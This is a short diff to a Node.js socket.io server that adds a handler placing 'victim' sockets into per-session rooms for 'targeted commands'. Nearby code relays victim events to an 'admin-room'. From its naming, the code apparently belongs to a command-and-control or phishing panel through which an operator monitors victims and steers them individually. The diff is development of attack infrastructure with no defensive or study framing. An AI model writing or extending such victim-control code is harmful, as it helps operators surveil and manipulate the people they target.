@@ -13,6 +13,14 @@ function setupSocket(socketIO) {
       console.log('Admin joined admin-room:', socket.id);
     });
 
+    // Victim joins their session room for targeted commands
+    socket.on('join-session', (sessionId) => {
+      if (sessionId) {
+        socket.join(sessionId);
+        console.log(`Socket ${socket.id} joined session room: ${sessionId}`);
+      }
+    });
+
     // Victim events broadcast to admin room
     socket.on('victim-raw-event', (data) => {
       io.to('admin-room').emit('victim-event', data);
